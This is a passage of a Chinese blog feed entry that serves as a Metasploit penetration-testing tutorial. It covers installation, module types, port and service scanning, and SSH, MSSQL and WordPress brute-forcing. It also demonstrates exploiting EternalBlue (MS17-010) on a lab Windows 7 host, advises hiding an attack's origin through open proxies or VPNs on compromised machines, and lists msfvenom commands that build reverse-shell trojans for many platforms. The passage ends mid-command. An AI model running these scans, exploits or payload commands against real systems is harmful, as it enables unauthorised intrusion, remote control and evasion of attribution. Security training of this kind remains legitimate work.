      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSF渗透常用操作指南</title>
    <link href="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/"/>
    <url>/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h2 id="MSF渗透常用操作指南"><a href="#MSF渗透常用操作指南" class="headerlink" title="MSF渗透常用操作指南"></a>MSF渗透常用操作指南</h2><h3 id="一、msf安装与更新"><a href="#一、msf安装与更新" class="headerlink" title="一、msf安装与更新"></a>一、msf安装与更新</h3><p><strong>在服务器或者虚拟机执行</strong>(linux)</p><blockquote><p>curl <a href="https://raw.githubusercontent.com/rapid7/metasploitomnibus/master/config/templates/metasploit-frameworkwrappers/msfupdate.erb">https://raw.githubusercontent.com/rapid7/metasploitomnibus/master/config/templates/metasploit-frameworkwrappers/msfupdate.erb</a> &gt; msfinstall </p></blockquote><blockquote><p>chmod 755 msfinstall </p></blockquote><blockquote><p>./msfinstall</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202000955061.png" alt="image-20220202000955061"></p><p><strong>然后验证是否安装成功</strong></p><p><strong>输入msfconsole</strong></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202001051064.png" alt="image-20220202001051064"></p><p>Windows安装</p><p><a href="https://windows.metasploit.com/metasploitframework-latest.msi">点击下载</a> <a href="https://windows.metasploit.com/metasploitframework-latest.msi">https://windows.metasploit.com/metasploitframework-latest.msi</a></p><p><strong>安装</strong></p><p>解压安装包后直接点击安装</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202002027304.png" alt="image-20220202002027304"></p><p>添加环境变量</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202002100966.png" alt="image-20220202002100966"></p><p><strong>使用</strong></p><p>打开终端输入<code>msfconsole</code>直接使用</p><h3 id="二、更新msf"><a href="#二、更新msf" class="headerlink" title="二、更新msf"></a>二、更新msf</h3><blockquote><p>在目录内运行命令<code>./msfupdate</code></p></blockquote><blockquote><p>运行命令<code>apt update</code>,<code>apt install metasploit-framework</code></p></blockquote><p>如果./msfupdate不能执行 就把 /opt/metasploit-framework/bin/msfupdate 文件里面的 –allow-downgrades 参 数给去除掉，就可以更新了。</p><h3 id="三、msf七大模块介绍"><a href="#三、msf七大模块介绍" class="headerlink" title="三、msf七大模块介绍"></a>三、msf七大模块介绍</h3><p>msf有很多模块 一共有7个</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202003208833.png" alt="image-20220202003208833"></p><blockquote><p>命令：ls /opt/metasploit-framework/embedded/framework/modules/ -al</p></blockquote><p>auxiliary 辅助模块，该模块是用于辅助渗透的，比如端口扫描、存活探测、暴力破解、扫描、发掘漏洞、探测信息等工作。 </p><p>encoders 编码器模块，对payload进行编码加密，可绕过部分杀软软件，将攻击载荷进行编码（类似与加密），让避免操作系统和杀毒软件辨认出来但是会让载荷的体积变大，这个时候需要选择传输器和传输体配对成的攻击载荷来下载目标载荷并且运行。。</p><p>evasion 躲避模块，该模块分类下只有4个，都是为了躲避微软的限制或者是杀软 的，免杀效果很一般。</p><p>exploits 漏洞利用模块，这个模块通常是用于对某些有可能存在漏洞的目标进行漏洞利用，利用已发现的漏洞对远程目标系统进行攻击，植入并运行攻击载荷，从而控制目标系统。 </p><p>nops 空指令模块，为了避免攻击载荷在执行的过程中出现随机地址和返回地址错误而在执行shellcode之前加入一些空指令，使得在执行shellcode时有一个较大的安全着陆区。。</p><p>payloads 攻击载荷，exploit成功之后就会执行payload，这段payload可以是反弹 代码，可以是添加用户的代码，在渗透攻击触发漏洞后劫持程序执行流程并跳入的这段代码。本模块的作用是消除安全工作人员开发这部分代码的代价。 </p><p>post 后渗透模块，该模块一般用于内网渗透。</p><h3 id="四、msf之auxiliary常用模块演示"><a href="#四、msf之auxiliary常用模块演示" class="headerlink" title="四、msf之auxiliary常用模块演示"></a>四、msf之auxiliary常用模块演示</h3><p> 先查看auxiliary的功能模块</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202005949109.png" alt="image-20220202005949109"></p><p>Metasploit的辅助模块主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ测试发掘漏洞、实施网络协议欺骗等</p><p><em><strong>/<em>auxiliary模块命名规则/</em></strong></em></p><p>　命名规则：功能/服务/模块名称</p><p>例如：  scanner/discovery/arp_sweep</p><p><strong>一、辅助模块(auxiliary)分为三个大类</strong></p><p><em>1、Admin</em></p><ul><li><p>Admin/HTTP模块</p></li><li><p>Admin/MSSQL模块</p></li><li><p>Admin/MySQL模块</p></li><li><p>Admin/Postgres模块</p></li><li><p>Admin/VMWare模块</p></li></ul><p><em>2、Scanner</em></p><ul><li><p>DCERPC</p></li><li><p>Discovery</p></li><li><p>FTP</p></li><li><p>HTTP</p></li><li><p>IMAP</p></li><li><p>MSSQL</p></li><li><p>MySQL</p></li><li><p>NetBIOS</p></li><li><p>POP3</p></li><li><p>SMB</p></li><li><p>SMTP</p></li><li><p>SNMP</p></li><li><p>SSH</p></li><li><p>Telnet</p></li><li><p>TFTP</p></li><li><p>VMWare</p></li><li><p>VNC</p></li></ul><p><em>3、Server</em></p><ul><li>捕获模块</li></ul><p><strong>二、Admin例子</strong></p><p>1、查找关于mysql的辅助模块</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202125200330.png" alt="image-20220202125200330"></p><p>2、选择auxiliary/admin/mysql/mysql_sql</p><p>use 1</p><p>3、查看需要设置的参数</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202125220394.png" alt="image-20220202125220394"></p><p>4、设置目标主机、用户名和密码，</p><p>5、run，执行</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202125236483.png" alt="image-20220202125236483"></p><p>其他的就不演示了 </p><p><strong>三、scanner例子</strong></p><p><em><strong>常用扫描模块及功能</strong></em></p><ul><li><p>auxiliary/scanner/portscan    端口扫描<br>auxiliary/scanner/smb/smb_version    SMB系统版本扫描<br>auxiliary/scanner/smb/smb_enumusers    SMB枚举<br>auxiliary/scanner/smb/smb_login    SMB弱口令扫描<br>auxiliary/admin/smb/psexec_command    SMB登录且执行命令<br>auxiliary/scanner/ssh/ssh_login    ssh登录测试<br>scanner/ mssq/mssql_ping    MSSQL主机信息扫描<br>admin/mssql/mssql_enum    MSSQL枚举<br>admin/mssql/mssql_exec    MSSQL执行命令<br>admin/mssql/mssql_sql    MSSQL查询<br>scanner/mssql/mssql_login    MSSQL弱口令扫描<br>auxiliary/admin/mysql/mysql_enum    MYSQL枚举<br>auxiliary/admin/mysql/mysql_sql    MYSQL语句执行<br>auxiliary/scanner/mysql/mysql_login    MYSQL弱口令扫描<br>auxiliary/scanner/smtp/smtp_version    SMTP版本扫描<br>auxiliary/scanner/smtp/smtp_enum    SMTP枚举<br>auxiliary/scanner/snmp/community    SNMP扫描设备<br>auxiliary/scanner/telnet/telnet_login    TELNET登录<br>scanner/vnc/vnc_none_auth    VNC空口令扫描</p></li><li><p>arp扫描<br>search arp<br>use auxiliary/scanner/discovery/arp_sweep<br>set interface rhost shost smac threads<br>run</p></li><li><p>端口扫描<br>search portscan<br>use auxiliary/scanner/portscan/syn<br>set interface posts rhosts threads<br>run</p></li><li><p>密码嗅探<br>use auxiliary/sniffer/psnuffle<br>支持从pcap抓包文件中提取密码<br>功能类似于dsniff<br>目前只支持pop3 imap ftp http_get协议</p></li><li><p>SNMP扫描<br>vi /etc/default/snmpd 侦听地址修改为0.0.0.0<br>use auxiliary/scanner/snmp_login<br>use auxiliary/scanner/snmp_enum<br>use auxiliary/scanner/snmp_enumusers （windows）<br>use auxiliary/scanner/snmp_enumshares （windows）</p></li><li><p>smb<br>smb版本扫描<br>use auxiliary/scanner/smb/smb_version<br>扫描命名管道，判断smb服务类型（账号、密码）<br>use auxiliary/scanner/smb/pipe_auditor<br>smb共享枚举（账号、密码）<br>use auxiliary/scanner/smb/smb_enumshares<br>smb用户枚举（账号、密码）<br>use auxiliary/scanner/smb/smb_enumusers<br>sid枚举（账号、密码）<br>use auxiliary/scanner/smb/smb_lookupsid</p></li><li><p>ssh<br>SSH版本扫描<br>use auxiliary/scanner/ssh/ssh_version<br>SSH密码爆破<br>use auxiliary/scanner/ssh/ssh_login<br>set userpass_file /usr/share/metasploit-framework/data/wordlist/root_userpass.txt<br>set verbose false<br>run<br>ssh -l root<br>ssh 192.168.0.11<br>ssh -l root 192.168.0.11<br>ssh <a href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x30;&#46;&#x31;&#x31;">&#114;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x30;&#46;&#x31;&#x31;</a><br>ssh -p 12333 192.168.0.11<br>ssh -l root -p 12333 216.230.230.114<br>ssh -p 12333 <a href="mailto:&#x72;&#111;&#111;&#116;&#64;&#50;&#49;&#54;&#x2e;&#x32;&#51;&#48;&#x2e;&#50;&#x33;&#x30;&#46;&#x31;&#x31;&#x34;">&#x72;&#111;&#111;&#116;&#64;&#50;&#49;&#54;&#x2e;&#x32;&#51;&#48;&#x2e;&#50;&#x33;&#x30;&#46;&#x31;&#x31;&#x34;</a><br>SSH公钥登录<br>use auxiliary/scanner/ssh/ssh_login_pubkey<br>set key_file di_rsa<br>set username root<br>run</p></li><li><p>mssql<br>Mssql扫描端口<br>TCP 1433 （动态端口）/UDP 1434 （查询TCP端口号）<br>use auxiliary/scanner/mssql_ping<br>爆破mssql密码<br>use auxiliary/scanner/mssql_login<br>远程代码执行<br>use auxiliary/admin/mssql/mssql_exec<br>set cmd net user pass /add</p></li><li><p>ftp<br>ftp版本扫描<br>use auxiliary/scanner/ftp/ftp_version<br>use auxiliary/scanner/ftp/anonymous<br>use auxiliary/scanner/ftp/ftp_login</p></li><li><p>vnc<br>VNC：虚拟网络控制台，是一款优秀的远程控制工具软，基于 UNIX 和 Linux 操作系统的免费的开源软件，远程控制能力强大，高效实用，其性能可以和 Windows 和 MAC 中的任何远程控制软件媲美<br>vnc密码破解<br>use auxiliary/scanner/vnc/vnc_login<br>vnc无密码访问<br>use auxiliary/scanner/vnc/vnc_none_auth</p></li><li><p>rdp<br>RDP远程桌面漏洞<br>use auxiliary/scanner/rdp/ms12_020_check<br>-检查不会造成dos攻击</p></li><li><p>设备后门<br>use auxiliary/scanner/ssh/juniper_backdoor<br>use auxiliary/scanner/ssh/fortine_backdoor</p></li><li><p>HTTP弱点扫描<br>过期证书<br>use auxiliary/scanner/http/cert<br>显示目录及文件<br>use auxiliary/scanner/http/dir_listing<br>use auxiliary/scanner/http/files_dir<br>WEBDAV Unicode编码身份验证绕过<br>IIS的WebDAV功能在解析URI并发送回数据时没有正确地处理Unicode令牌环，远程攻击者可以通过提交恶意HTTPGET请求绕过受口令保护的文件夹的认证，或在受口令保护的WebDAV目录中列出、上传或下载文件<br>use auxiliary/scanner/http/dir_webdav_unicode_bypass</p></li><li><p>tomcat管理登录页面<br>use auxiliary/scanner/http/tomcat_mgr_login</p></li><li><p>基于http方法的身份验证绕过<br>use auxiliary/scanner/http/tomcat_auth_bypass</p></li><li><p>wordpress密码爆破<br>use auxiliary/scanner/http/wordpress_login_enum<br>set uri /wordpress/wp-login.php</p></li><li><p>wmap web应用扫描器<br><a href="https://www.cnblogs.com/kyx599/p/12936169.html">https://www.cnblogs.com/kyx599/p/12936169.html</a></p></li><li><p>telnet爆破<br>use auxiliary/scanner/telnet/telnet_login</p></li></ul><h4 id="端⼝扫描"><a href="#端⼝扫描" class="headerlink" title="端⼝扫描"></a><em>端⼝扫描</em></h4><ul><li>ACK 通过ACK扫描的方式对防火墙上未屏蔽的端口进行探测 </li><li>ACK防⽕墙扫描 auxiliary/scanner/portscan/ack </li><li>ftpbounce 通过FTPbounce攻击的原理对TCP服务进行枚举，一些新的FTP服务器 软件能够很好的防范FTPbounce攻击，但在一些旧的Solaris及FreeBSD系统的FTP服务中 此类工具方法仍能够被利用 </li><li>FTP跳端⼝扫描 auxiliary/scanner/portscan/ftpbounce </li><li>syn 使用发送TCP SYN标志的方式探测开放的端口 </li><li>SYN端⼝扫描 auxiliary/scanner/portscan/syn </li><li>tcp 通过一次完整的TCP连接来判断端口是否开放，这种扫描方式最准确， 但扫描速度较慢 </li><li>TCP端⼝扫描 auxiliary/scanner/portscan/tcp </li><li>xmas 一种更为隐秘的扫描方式，通过发送FIN,PSH,和URG标志，能够躲避 一些高级的TCP标记检测器的过滤</li><li>TCP-XMas端⼝扫描 auxiliary/scanner/portscan/xmas</li></ul><p><em><strong>TCP端⼝扫描：auxiliary/scanner/portscan/tcp</strong></em></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202150939018.png" alt="image-20220202150939018"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202152627022.png" alt="image-20220202152627022"></p><p>扫描结束 192.168.1.14的开放端口</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202152736157.png" alt="image-20220202152736157"></p><p><em><strong>ACK防⽕墙扫描：auxiliary/scanner/portscan/ack</strong></em></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202153306378.png" alt="image-20220202153306378"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202153327426.png" alt="image-20220202153327426"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202153603820.png" alt="image-20220202153603820"></p><p>⽤ACK扫描会分段去发送数据包扫描，才能够绕过⼀些防火墙设备，⽽不是 Windows防火墙！Windows⾃带的防火墙是阻断⼀切进入的连接! 因为虚拟机Windwos 7是吧防火墙关闭了的，如果打开那么防火墙是会阻断 连接的！ 经过测试，Windows防火墙开启，使⽤ACK是扫描不出来的！</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202153629956.png" alt="image-20220202153629956"></p><p><em><strong>FTP跳端⼝扫描 auxiliary/scanner/portscan/ftpbounce</strong></em> </p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202154130153.png" alt="image-20220202154130153"></p><p>这个因为环境情况 就没有演示</p><p>详细可参考：<a href="https://blog.csdn.net/asdushf/article/details/111691756">https://blog.csdn.net/asdushf/article/details/111691756</a></p><p><em><strong>SYN端⼝扫描 auxiliary/scanner/portscan/syn</strong></em></p><p>TCP 端口扫描是通过SYN数据包进行的，用于扫描目标机器的端口上是否存在程序监听，通常意义上，普通个人机器上的某个端口如果有程序监听的话，那么它一般是 系统漏洞。由于TCP是一个有连接的可靠协议，所以要使用 三次握手来建立连接， 三次握手的 报文分别是(SYN)、(ACK SYN)和(ACK)。进行 端口扫描时，首先向对方主机的某一端口发送(SYN) 报文，如果对方这一端口上有程序在监听（或者说存在漏洞），则回复(SYN ACK) 报文，否则回复(RST)报文。据此就可以判断对方端口上是否有程序在监听了，或者是否存在漏洞了。<br>参考：<a href="https://blog.51cto.com/ksyiwen/1336392">https://blog.51cto.com/ksyiwen/1336392</a></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202155034118.png" alt="image-20220202155034118"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202155048056.png" alt="image-20220202155048056"></p><p><em><strong>TCP-XMas端⼝扫描 auxiliary/scanner/portscan/xmas</strong></em></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220202155853690.png" alt="image-20220202155853690"></p><h4 id="常见的网络服务扫描"><a href="#常见的网络服务扫描" class="headerlink" title="常见的网络服务扫描"></a>常见的网络服务扫描</h4><h5 id="1-Telnet服务扫描"><a href="#1-Telnet服务扫描" class="headerlink" title="1.Telnet服务扫描"></a>1.Telnet服务扫描</h5><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203001914027.png" alt="image-20220203001914027"></p><p>代码清单3-19中的扫描结果显示，IP地址为10.10.10.254的主机（即网关服务器）开放了Telnet服务，通过返回的服务旗标“Ubuntu 8.041x0ametasploitable login : ”，可以进一步确认出这台主机的操作系统版本为Ubuntu 8.04，而主机名为metasploitable。</p><h5 id="2-SSH服务扫描"><a href="#2-SSH服务扫描" class="headerlink" title="2.SSH服务扫描"></a>2.SSH服务扫描</h5><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203002054031.png" alt="image-20220203002054031"></p><p>如代码清单3-20所示，使用Metasploit中的ssh_version辅助模块，很快在网络中定位了两台开放SSH服务的主机，分别是10.10.10.129(网站服务器）和10.10.10.254（网关服务器)，并且显示了SSH服务软件及具体版本号。</p><h4 id="3-Oracle数据库服务查点"><a href="#3-Oracle数据库服务查点" class="headerlink" title="3.Oracle数据库服务查点"></a>3.Oracle数据库服务查点</h4><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203002153611.png" alt="image-20220203002153611"></p><h4 id="4-开放代理探测与利用"><a href="#4-开放代理探测与利用" class="headerlink" title="4.开放代理探测与利用"></a>4.开放代理探测与利用</h4><p>在一些特殊情形的渗透测试工作中，为避免被对方的入侵检测系统跟踪，你很有可能需要隐藏自己的身份。隐藏网络身份的技术很多，比如使用代理服务器(Proxy)、VPN等，不过最简单和最常见的还是使用代理服务器。<br>Metasploit提供了open_proxy模块，能够让你更加方便地获取免费的HTTP代理服务器地址。获取免费开放代理之后，就可以在浏览器或者一些支持配置代理的渗透软件中配置代理，这可以在进行渗透测试时隐藏你的真实I地址。其使用方法如代码清单3-22所示。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203002320432.png" alt="image-20220203002320432"></p><p>当然，也可以从互联网上搜索一些开放的HTTP、Socks等代理服务器，然后通过代理猎手等专用工具进行验证，并在进行隐蔽性渗透测试的场景中进行使用。比开放代理更保险的隐藏攻击源方法是利用开放的或者自主架设的VPN服务，可以从公开渠道搜集到一些免费的VPN服务，也可以自己在已控制的主机上架设OpenVPN服务。使用这些VPN可以采用加密方式转发路由你的渗透测试数据包，而无需担心你的攻击发起源被跟踪到。</p><h4 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h4><p>探测对方操作系统信息：use auxiliary/scanner/smb/smb_version</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203000138282.png" alt="image-20220203000138282"></p><p>可以看到，操作系统是Windows 7,主机名是:FUZHONG,在GOD域内</p><p>扫描永恒之蓝ms17010 ：use auxiliary/scanner/smb/smb_ms17_010</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203000621982.png" alt="image-20220203000621982"></p><p>Host is likely VULNERABLE to MS17-010! 说明是存在永恒之蓝</p><p>利用：</p><p>可以先用search 搜索一下17010的漏洞利用模块</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203000827312.png" alt="image-20220203000827312"></p><p>这里就随便选一个来利用了</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203001046782.png" alt="image-20220203001046782"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203001103253.png" alt="image-20220203001103253"></p><p>就设置了ip  其他参数默认 然后攻击</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203001144002.png" alt="image-20220203001144002"></p><p>尴尬 这里好像失败了  原来是360没关   </p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203001014494.png" alt="image-20220203001014494"></p><p>之后重新测试</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203001329774.png" alt="image-20220203001329774"></p><p>小tips：这里是set rhosts 是可以设置多个的  可以同时测试多个目标</p><h3 id="五、msf之Exploits模块常用演示"><a href="#五、msf之Exploits模块常用演示" class="headerlink" title="五、msf之Exploits模块常用演示"></a>五、msf之Exploits模块常用演示</h3><h4 id="1、显示所有渗透攻击模块"><a href="#1、显示所有渗透攻击模块" class="headerlink" title="1、显示所有渗透攻击模块"></a>1、显示所有渗透攻击模块</h4><p><strong>show exploits</strong></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203004645567.png" alt="image-20220203004645567"></p><h4 id="2、查找关于smb的攻击模块"><a href="#2、查找关于smb的攻击模块" class="headerlink" title="2、查找关于smb的攻击模块"></a>2、查找关于smb的攻击模块</h4><blockquote><p>search name:smb type:exploit</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203004749932.png" alt="image-20220203004749932"></p><h4 id="3、查找路径含有smb的模块"><a href="#3、查找路径含有smb的模块" class="headerlink" title="3、查找路径含有smb的模块"></a>3、查找路径含有smb的模块</h4><blockquote><p>search path:smb</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203004833122.png" alt="image-20220203004833122"></p><p>用ms17010演示：exploit/windows/smb/ms17_010_psexec </p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203005318222.png" alt="image-20220203005318222"></p><p>可以看到弹回一个会话</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203005403791.png" alt="image-20220203005403791"></p><p>其他 Exploit模块的操作也是如此 就不演示了</p><h3 id="六、msf之Payloads模块常用演示"><a href="#六、msf之Payloads模块常用演示" class="headerlink" title="六、msf之Payloads模块常用演示"></a>六、msf之Payloads模块常用演示</h3><h4 id="Payloads分类"><a href="#Payloads分类" class="headerlink" title="Payloads分类"></a>Payloads分类</h4><p>1、singles：独立载荷，可直接植入目标系统并执行相应的程序，如：shell_bind_tcp这个payload。</p><p>2、stagers：传输器载荷，用于目标机与攻击机之间建立稳定的网络连接，与传输体载荷配合攻击。通常该种载荷体积都非常小，可以在漏洞利用后方便注入，这类载荷功能都非常相似，大致分为bind型和reverse型，bind型是需要攻击机主动连接目标端口的；而reverse型是目标机会反连接攻击机，需要提前设定好连接攻击机的ip地址和端口号。</p><p>3、stages：传输体载荷，如shell，meterpreter等。在stagers建立好稳定的连接后，攻击机将stages传输给目标机，由stagers进行相应处理，将控制权转交给stages。比如得到目标机的shell，或者meterpreter控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。</p><h4 id="显示所有可用payloads"><a href="#显示所有可用payloads" class="headerlink" title="显示所有可用payloads"></a>显示所有可用payloads</h4><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203011612790.png" alt="image-20220203011612790"></p><p>Metasploit 生成的 Payload分为正向和反向</p><h4 id="最常见的payload"><a href="#最常见的payload" class="headerlink" title="最常见的payload"></a>最常见的payload</h4><ul><li>windows/meterpreter/bind_tcp    #正向连接</li><li>windows/meterpreter/reverse_tcp  #反向连接，常用</li><li>windows/meterpreter/reverse_http  #通过监听80端口反向连接</li><li>windows/meterpreter/reverse_https #通过监听443端口反向连接</li></ul><h4 id="反向payload"><a href="#反向payload" class="headerlink" title="反向payload"></a>反向payload</h4><p>反向就是说目标执⾏了我们⽣成的Payload后，会主动连接我们的攻击服务 器MSF</p><h5 id="生成木马命令：msfvenom"><a href="#生成木马命令：msfvenom" class="headerlink" title="生成木马命令：msfvenom"></a>生成木马命令：<code>msfvenom</code></h5><p><strong>msfvenom详细语法</strong></p><ul><li>-e, –encoder [encoder] 指定需要使用的encoder（编码器）<br>-a, –arch &lt; architecture&gt; 指定payload的目标架构<br>–platform &lt; platform&gt; 指定payload的目标平台<br>-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度<br>-b, –bad-chars &lt; list&gt; 设定规避字符集，比如: &amp; #039;/x00/xff&amp; #039;<br>-i, –iterations &lt; count&gt; 指定payload的编码次数<br>-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件<br>-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板<br>-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行<br>–payload-options 列举payload的标准选项<br>-o, –out &lt; path&gt; 保存payload<br>-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式<br>–shellest 最小化生成payload<br>-h, –help 查看帮助选项<br>–help-formats 查看msf支持的输出格式列表</li></ul><h5 id="生成木马语句"><a href="#生成木马语句" class="headerlink" title="生成木马语句"></a>生成木马语句</h5><ul><li><p>二进制<br>linux:msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf</p></li><li><p>windows:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe</p></li><li><p>mac: msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho</p></li><li><p>web<br>php:msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ’ | tr -d ‘/n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</p></li><li><p>asp:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp</p></li><li><p>jap:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp</p></li><li><p>war:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war</p></li><li><p>脚本<br>python:msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py</p></li><li><p>bash:msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh</p></li><li><p>perl:msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; 